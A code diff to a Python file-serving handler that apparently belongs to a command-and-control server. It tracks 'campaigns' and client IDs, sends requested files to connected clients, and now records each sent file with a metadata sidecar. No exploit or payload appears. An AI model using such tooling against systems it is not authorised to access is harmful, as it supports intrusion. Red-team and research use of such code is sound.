@@ -4,6 +4,7 @@ import json
 import logging
 import random
 import string
+import datetime
 from handlers.base_handler import BaseHandler
 
 logger = logging.getLogger(__name__)
@@ -12,7 +13,7 @@ class FileDownloadHandler(BaseHandler):
     """Handler for file download requests from clients"""
     
     def handle(self):
-        """Process file download request from client"""
+        """Process file download request from client (server sends, client downloads)"""
         # Log the specific path being used for debugging
         self.log_message(f"File download request received on path: {self.request_handler.path}")
         
@@ -121,7 +122,7 @@ class FileDownloadHandler(BaseHandler):
             
     def _process_file_request(self, client_id, file_request_json):
         """
-        Process the file request and return the file data with improved error handling
+        Process a client's request to download a file from the server
         
         Args:
             client_id: The client ID
@@ -155,9 +156,9 @@ class FileDownloadHandler(BaseHandler):
                 }
             
             # Log the request
-            self.log_message(f"File download request from {client_id or self.client_address[0]}: {file_path}")
+            self.log_message(f"File request from client {client_id or self.client_address[0]}: {file_path}")
             if client_id:
-                self.client_manager.log_event(client_id, "File Download Request", f"Requested file: {file_path}")
+                self.client_manager.log_event(client_id, "File Request", f"Client requested server file: {file_path}")
             
             # Determine the file path in the campaign folders
             campaign_folder = self.get_campaign_folder()
@@ -196,7 +197,7 @@ class FileDownloadHandler(BaseHandler):
             if not actual_path:
                 self.log_message(f"File not found in any of {len(possible_locations)} possible locations")
                 return {
-                    "Status": "Error",
+                    "Status": "Error", 
                     "Message": f"File not found: {file_path}"
                 }
             
@@ -207,36 +208,13 @@ class FileDownloadHandler(BaseHandler):
             file_size = len(file_content)
             file_content_base64 = base64.b64encode(file_content).decode('utf-8')
             
-            # Also save a copy to the uploads folder for reference
-            # This makes sure we track files sent to clients
-            if client_id:
-                client_uploads_folder = os.path.join(uploads_folder, client_id)
-                os.makedirs(client_uploads_folder, exist_ok=True)
-                
-                # Save a copy of the file to the uploads folder with a tracking prefix
-                upload_filename = f"sent_to_client_{os.path.basename(actual_path)}"
-                upload_path = os.path.join(client_uploads_folder, upload_filename)
-                
-                try:
-                    # Only save if it doesn't already exist or is different
-                    should_save = True
-                    if os.path.exists(upload_path):
-                        # Compare file contents
-                        with open(upload_path, 'rb') as existing_file:
-                            existing_content = existing_file.read()
-                        should_save = existing_content != file_content
-                    
-                    if should_save:
-                        with open(upload_path, 'wb') as f:
-                            f.write(file_content)
-                        self.log_message(f"Saved copy of sent file to {upload_path}")
-                except Exception as e:
-                    self.log_message(f"Warning: Could not save copy of sent file: {e}")
+            # Save a copy of the sent file to the uploads folder (server perspective)
+            self._record_file_sent_to_client(client_id, actual_path, file_content, destination)
             
-            # Log the successful file access
-            self.log_message(f"File found at {actual_path}, sending to client ({file_size} bytes)")
+            # Log the successful file transmission
+            self.log_message(f"File {actual_path} ({file_size} bytes) sent to client {client_id or self.client_address[0]}")
             if client_id:
-                self.client_manager.log_event(client_id, "File Upload To Client", f"Sending file: {actual_path} ({file_size} bytes) to client destination: {destination}")
+                self.client_manager.log_event(client_id, "File Sent", f"Server file {actual_path} ({file_size} bytes) sent to client")
             
             # Create and return the response
             return {
@@ -258,3 +236,38 @@ class FileDownloadHandler(BaseHandler):
                 "Status": "Error",
                 "Message": f"Error processing file request: {str(e)}"
             }
+
+    def _record_file_sent_to_client(self, client_id, source_path, file_content, destination=None):
+        """Record a copy of a file sent to client in the uploads folder"""
+        if not client_id:
+            return
+            
+        campaign_folder = self.get_campaign_folder()
+        uploads_folder = os.path.join(campaign_folder, "uploads", client_id)
+        os.makedirs(uploads_folder, exist_ok=True)
+        
+        # Create a filename that indicates this was sent to the client
+        filename = f"sent_to_client_{os.path.basename(source_path)}"
+        upload_path = os.path.join(uploads_folder, filename)
+        
+        try:
+            # Save a copy of the file
+            with open(upload_path, 'wb') as f:
+                f.write(file_content)
+                
+            # Add a metadata file with additional information
+            metadata_path = f"{upload_path}.meta"
+            
+            metadata = {
+                "original_path": source_path,
+                "client_destination": destination,
+                "size_bytes": len(file_content),
+                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+            with open(metadata_path, 'w') as f:
+                json.dump(metadata, f, indent=2)
+                
+            self.log_message(f"Recorded file sent to client {client_id} at {upload_path}")
+        except Exception as e:
+            self.log_message(f"Warning: Could not record file sent to client: {e}")
